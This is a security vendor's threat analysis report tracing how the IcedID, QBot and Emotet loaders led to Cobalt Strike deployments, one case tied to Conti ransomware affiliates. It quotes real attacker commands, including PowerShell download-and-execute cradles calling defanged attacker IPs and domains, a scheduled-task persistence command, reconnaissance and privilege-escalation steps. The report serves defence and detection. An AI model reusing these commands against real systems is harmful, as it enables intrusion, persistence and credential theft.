The Cybereason Global Security Operations Center Team (GSOC) issues Cybereason Threat Analysis reports to
inform on impacting threats. The Threat Analysis reports investigate these threats and provide practical
recommendations for protecting against them.
In this Threat Analysis report, the GSOC provides details about three recent attack scenarios where fast-moving
malicious actors used the malware loaders IcedID, QBot, and Emotet to deploy the Cobalt Strike framework on the
compromised systems.
The deployment of Cobalt Strike as part of an attack significantly increases the severity of the attack due to the
framework’s high damage potential. One of the attack scenarios that we discuss in this article involves affiliates of
the Conti ransomware group.

Key Points
Fast-moving adversaries: The threat actors conducted malicious activities in the compromised systems after
only approximately 8 minutes after infecting the systems with the malware loader IcedID, QBot, or Emotet.
The malicious actors deployed Cobalt Strike up to approximately 2 hours after accessing the compromised
systems.
Targeted phishing emails: Malicious actors, who we attribute as affiliates of the Conti ransomware group,
specifically targeted a user by sending the user an email with an attachment (an Excel document) that was
almost identical to a legitimate email and email attachment already distributed to other users within the
organization. The difference was that the attached Excel document contained a malicious macro that
distributed IcedID.
Detected and prevented: The Cybereason XDR Platform effectively detects and prevents the IcedID, QBot,
and Emotet malware.
Cybereason Managed Detection and Response (MDR): The Cybereason GSOC has zero tolerance
towards attacks that involve malware loaders, such as IcedID, QBot, and Emotet, and categorizes such
attacks as critical, high-severity incidents. The Cybereason GSOC MDR Team issues a comprehensive report
to customers when such an incident occurs. The report provides an in-depth overview of the incident, which
helps scope the extent of compromise and the impact on the customer’s environment. In addition, the report
provides attribution information when possible as well as recommendations for mitigating and isolating the
threat.

Introduction
Cobalt Strike is an adversary simulation framework with the primary use case of assisting red team operations.
However, Cobalt Strike is also actively used by malicious actors for conducting post-intrusion malicious activities.
Cobalt Strike is a modular framework with an extensive set of features that are useful to malicious actors, such as
command execution, process injection, and credential theft.
The deployment of Cobalt Strike as part of an attack significantly increases the severity of the attack: for example,
once Cobalt Strike runs on a compromised system, the Cobalt Strike operators can broker the system as an initial
access point to other threat actors, including ransomware group affiliates.
In the period between October 2021 and the time of writing this article, the Cybereason GSOC has observed
multiple attack scenarios where malicious actors used malware that is capable of deploying additional malware on
compromised systems (i.e. malware loaders) to deploy Cobalt Strike on the systems.
In this article, we present the activities of the malware loaders and the malicious actors that operated the loaders in
three selected attack scenarios. Each scenario involves one of the malware loaders IcedID, QBot, and Emotet, and
results in the deployment of Cobalt Strike. One of the attack scenarios that we discuss in this article involves
affiliates of the Conti ransomware group.

2/25

Malicious actors use the IcedID malware to distribute various types of malware, including ransomware, to
compromised systems. Malicious actors typically infect systems with IcedID through attachments, usually Microsoft
Office documents, in phishing emails. Once deployed on a system, IcedID uses legitimate system utilities to
conduct malicious activities, such as reconnaissance activities and disabling security mechanisms. Malicious actors
also use the IcedID malware to deploy Cobalt Strike on compromised systems.
QBot, also known as Qakbot, is a malware that has been present on the threat landscape since 2007. QBot
originally featured information stealing and trojan functionalities, however, the malicious actors that develop QBot
have extended the malware with malware loading capabilities. In recent attack campaigns, malicious actors
distribute QBot through malicious attachments in phishing emails. QBot downloads and executes additional
malware on compromised machines, such as the Cobalt Strike framework, and ransomware, such as REvil and
ProLock.
Since security researchers first discovered the Emotet malware in 2014, the malware has evolved from a traditional
banking Trojan to a malware loader. Over the last few years, before authorities disrupted the infrastructure of
Emotet operators as part of a global operation in the first quarter of 2021, malicious actors have been using Emotet
to deliver the Ryuk ransomware to compromised systems.
On November 15, 2021, security researchers announced the discovery of a new variant of Emotet on the threat
landscape. The Cybereason GSOC team observed attack scenarios that involved the new Emotet malware shortly
thereafter, which involved Emotet deploying Cobalt Strike on compromised systems.

Analysis
From IcedID to Cobalt Strike: Conti Ransomware Affiliates
The figure below depicts an infection using the IcedID malware that results in the deployment of Cobalt Strike. In
this scenario, the malicious actors, who we attribute as affiliates of the Conti ransomware group, specifically
targeted a user by sending the user an email with an attachment (an Excel document) that is almost identical to a
legitimate email and email attachment already distributed to other users within the organization.
The difference was that the attached Excel document contained a malicious macro. This indicates a potential longterm presence of the actors in the environment:

3/25

infection using the IcedID malware
When the targeted user executed the macro, the macro downloaded the executable file of the IcedID malware from
an attacker-controlled endpoint and then executed the file. The macro downloaded the IcedID executable to the
home directory of the user, such as C:\Users\test\javabridge64.exe, where javabridge64.exe is the name of the
IcedID executable and C:\Users\test is the home directory of the user test:

Malicious Office macro executes IcedID javabridge64.exe as seen in the Cybereason XDR Platform
Approximately 8 minutes after the malicious Office macro executed IcedID, the malicious actors executed the
SysInfo IcedID command to enumerate relevant system information, such as active processes, and to conduct the
following reconnaissance activities:

4/25

IcedID executed the following command to retrieve a list of the security solutions that are installed on the
compromised system:
wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
IcedID executed the command ipconfig /all to retrieve the networking configuration of the compromised
system.
IcedID executed the systeminfo.exe Windows utility to retrieve detailed information about the compromised
system, such as operating system version and hardware configuration.
IcedID executed the following commands to retrieve Active Directory (AD)-related information:
net view /all
net view /all /domain
net config workstation
net group "Domain Admins" /domain
nltest /domain_trusts
nltest /domain_trusts /all_trusts

5/25

IcedID reconnaissance activities as seen in the

Cybereason XDR Platform
Approximately 20 minutes after conducting reconnaissance activities, the malicious actors executed the ExecAdmin
IcedID command that attempts to elevate user privileges using a known Windows User Account Control (UAC)
bypass that leverages the fodhelper Windows utility.
After approximately 5 minutes, the malicious actors executed the Exec IcedID command to execute code by
injecting the code into a cmd.exe instance. Approximately 21 minutes later, the malicious actors executed a Cobalt
Strike loader using the command rundll32 adobe.dll,kasim (where kasim is a dynamic-link library - DLL - entry
point):

6/25

Execution of Cobalt Strike loader as seen in the Cybereason XDR Platform
A few minutes after executing the Cobalt Strike loader, the actors downloaded and executed PowerShell code from
the attacker-controlled endpoint with an IP address of 185.70.184[.]8 by executing the PowerShell command:
IEX ((new-object net.webclient).downloadstring('http://185.70.184[.]8:80/a')).
This attributes the actors as Conti affiliates, since the Conti group operated the endpoint with the IP address
185.70.184[.]8 in the week when the attack that we discussed took place. In addition, the security community has
observed Conti affiliates using the IcedID malware to deploy Cobalt Strike on compromised systems.
To deploy the IcedID malware, the Conti affiliates targeted a particular user. At a larger scale, in the middle of 2021,
we observed malicious actors deploying the IcedID malware on systems as part of the “stolen images evidence”
campaign, which we discuss in the following section.
Stolen Images Evidence Campaign
This “stolen images evidence” campaign involved phishing emails that legitimate organization contact forms had
generated and sent to the targeted users – the contact form recipient. The emails contained legal threats related to
copyright infringement due to the use of copyright-protected images that the targeted user had apparently stolen.
The emails urged the recipient to sign into a Google page that supposedly lists the images. After the user signed
into the page using valid Google credentials, the page downloaded and executed a malicious JavaScript (.js) script
using the Windows wscript utility.
The script executed a Base64-encoded PowerShell command to download and execute the IcedID malware, for
example:
IEX(New-Object Net.WebClient).downloadString('http://minerdone[.]top/222g100/index.php’).
The execution of this PowerShell command led to downloading and executing a DLL through the DllRegisterServer
entry point, such as:
rundll32.exe C:\Users\user\AppData\Local\Temp\VhfNmz.dat,DllRegisterServer.
This DLL conducted the first stage of deployment of the IcedID malware and we refer to it as first-stage IcedID DLL:

7/25

Download and execution of first-stage IcedID DLL as seen in the Cybereason XDR Platform
The first-stage DLL gathered information about the compromised machine, such as hardware and operating system
information, and downloaded data from an attacker-controlled endpoint, such as grenademetto[.]uno. The data was
encrypted using a symmetric encryption key.
The first-stage IcedID DLL decrypted the data that it had downloaded, which contained a DLL file and a data file
that typically had the name license.dat. The first-stage IcedID DLL typically wrote the DLL file in the user’s
%LocalAppData% directory, such as:
C:\Users\user\AppData\Local\Temp\rebuildx32.tmp, and the license.dat file in the user’s %AppData% directory.
The first-stage IcedID DLL then executed the DLL file, such as:
rundll32.exe “C:\Users\user\AppData\Local\Temp\rebuildx32.tmp",update /i:"ApproveFinish\license.dat", which we
refer to as second-stage IcedID DLL.
The main functionality of the second-stage IcedID DLL was to locate and process the license.dat file. license.dat
contained encrypted content that implemented the IcedID malware. The second-stage IcedID DLL decrypted the
content of license.dat and executed the IcedID malware by injecting the malware into a legitimate Windows
process, such as chrome.exe:

From QBot to Cobalt Strike

8/25

The figure below depicts an infection using the QBot malware that results in the deployment of Cobalt Strike:

An infection using the QBot malware
Malicious actors distribute QBot as attachments, typically Microsoft Office Excel documents, to phishing emails. The
Office Excel application prompts the user that has opened the document that distributes QBot to enable Office
macro execution. When the Office macro executes, the macro first downloads the QBot malware from an attackercontrolled endpoint and then executes the malware.
In the attack scenario that we analyzed, the macro stored the file that implements the QBot malware in the
%ProgramData% directory, such as C:\ProgramData, with the filename extension .ocx - Volet1.ocx (other names
include, for example, Volet2.ocx and Volet3.ocx). The .ocx file was a Windows DLL file that the macro executed
using the regsvr32 Windows utility. The DLL unpacked and loaded a Windows DLL named stager_1.dll that
implements the main QBot functionalities.
In addition, the DLL injected stager_1.dll into a legitimate Windows process - msra.exe:

9/25

Approximately 6 minutes after injecting stager_1.dll into msra.exe, Qbot conducted reconnaissance activities by
executing the commands net, arp, ipconfig, netstat, nslookup, route, and whoami. The figure below depicts the
execution of these commands, including command line parameters:

10/25

Qbot reconnaissance activities as seen in the Cybereason XDR Platform
Approximately 1 minute after conducting reconnaissance activities, QBot established persistence on the
compromised system by executing the following command:
schtasks.exe /Create /F /TN "{AO8F7C8F-D95F-4395-8732-9818EO0F3DB2}" /TR "cmd /c start /min \"\"
powershell.exe -Command
IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path
HKCU:\SOFTWARE\Cvdijvkees).omowidpdnpcwb))) " /SC MINUTE /MO 30
This command creates a scheduled task named {AO8F7C8F-D95F-4395-8732-9818EO0F3DB2} that periodically
executes Base64-encoded PowerShell code stored in the registry key
HKEY_CURRENT_USER\SOFTWARE\Cvdijvkees.
Approximately 48 minutes after creating a scheduled task, Qbot injected Rubeus, a tool for attacking Kerberos
deployments, into the legitimate Windows Update process wuauclt.exe. After approximately 18 minutes, QBot stole
web browser data, such as cookies and browsing history, using the recovery functionality of the esentutl Windows
utility.
After approximately 2 minutes, QBot attempted to exploit the PrintNightmare vulnerability by executing the InvokeNightmare PowerShell command to create an administrative user with the username admin1 and password
Password.
After approximately 48 minutes, QBot injected a Cobalt Strike module into msra.exe that contacted attackercontrolled endpoints known to be associated with Cobalt Strike at the time the attack took place:

From Emotet to Cobalt Strike
The figure below depicts an infection using the Emotet malware that results in the deployment of Cobalt Strike:

12/25

An infection using the Emotet malware
Malicious actors distribute Emotet as attachments, typically Microsoft Office Word or Excel documents, to phishing
emails. In addition to Office documents, malicious actors distribute Emotet through links that lead to Office
documents, archive files that store Office documents, and Universal Windows Application installation packages that
download and execute Emotet when a user executes the installation package:

13/25

Phishing email with attached Microsoft Word doc that distributes Emotet
Distribution: Office Word Document
If an Office Word document distributes Emotet, the Office Word application first prompts the user that has opened
the document to enable Office macro execution:

Office Word

application prompts a user to enable macro execution

14/25

When the user enables macro execution, a malicious Office macro that is part of the Word document and that
distributes Emotet executes. The macro first deobfuscates macro code by removing character arrays, such as Cew
(see the figure below), and then executes the deobfuscated macro code:

Implementation of a malicious macro that distributes Emotet
The de-obfuscated macro code executes PowerShell code. The PowerShell code establishes a connection to an
attacker-controlled endpoint and downloads Emotet to the %ProgramData% directory, such as C:\ProgramData.
Emotet typically arrives from the attacker-controlled endpoint in the form of a DLL file that the PowerShell code
stores under a random filename in the %ProgramData% directory. The PowerShell code then uses the rundll32
Windows utility to execute Emotet:

De-obfuscated macro code executes PowerShell that downloads and executes Emotet as seen in the Cybereason
XDR Platform
Alternatively to executing the PowerShell code directly, the de-obfuscated macro code may first create a Windows
Batch (.bat) file in the %ProgramData% directory under a random name, such as C:\ProgramData\sdfhiuwu.bat or
yksds.bat, and then execute the file. The .bat file stores obfuscated code that includes Base-64 encoded code and
code that is stored in multiple string variables.
The obfuscated code in the .bat file executes the PowerShell code that downloads and then uses the rundll32
Windows utility to execute Emotet:

the Cybereason XDR Platform
The PowerShell code uses the rundll32 Windows utility and specifies the DLL entry point Control_RunDLL or
DllRegisterServer to execute Emotet. We observed that rundll32 maps the Emotet DLL file under the internal name
of X.dll:

rundll32 maps an Emotet DLL file under the internal name of X.dll as seen in the Cybereason XDR Platform

17/25

Distribution: Office Excel Document
If an Office Excel document distributes Emotet, the Office Excel application prompts the user that has opened the
document to enable Office macro execution. The Excel document contains several hidden Excel worksheets that
store malicious Office macros that distribute Emotet.
When the user enables macro execution, the Office macros execute:

Office Excel

application prompts a user to enable macro execution
The macros establish a connection to an attacker-controlled endpoint to download the Emotet malware. Emotet
typically arrives from the attacker-controlled endpoint in the form of a DLL file that the macros store under a
filename with the extension .ocx, such as besta.ocx, bestb.ocx, or bestc.ocx.
The macros use the rundll32 Windows utility and specify the DLL entry point Control_RunDLL or DllRegisterServer
to execute Emotet. The macros may obfuscate the DLL entry point name by appending the ampersand (&)
character to individual characters of the name:

18/25

rundll32 executes Emotet: DllRegisterServer DLL entry point as seen in the Cybereason XDR Platform
Malicious Activities
When Emotet executes on a compromised system, the malware first establishes persistence by creating system
services that start at system startup or by creating registry values at the
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run registry key:

Emotet (DLL file: oxneternhgbtah.ybc) establishes persistence on compromised system as seen in the Cybereason
XDR Platform
Emotet then executes processes that conduct malicious activities. The processes that Emotet executes have
random names and are children processes of the process of the rundll32 utility that executes Emotet.
In the attack scenario that we analyzed, Emotet executed a process that steals cookies or web and email
credentials from client credential databases. Emotet used the keyword scomma in the process command line to
execute WebBrowserPassView, a tool that steals web credentials from browser credential databases. Emotet then
exfiltrated data from the compromised system to attacker-controlled endpoints:

Emotet exfiltrates data as seen in the Cybereason XDR Platform

20/25

After Emotet exfiltrated data, the Emotet operators deployed the Cobalt Strike framework on the compromised
system. Emotet deployed a Cobalt Strike beacon in the form of a DLL file and executed the beacon by invoking the
DllRegisterServer DLL entry point.
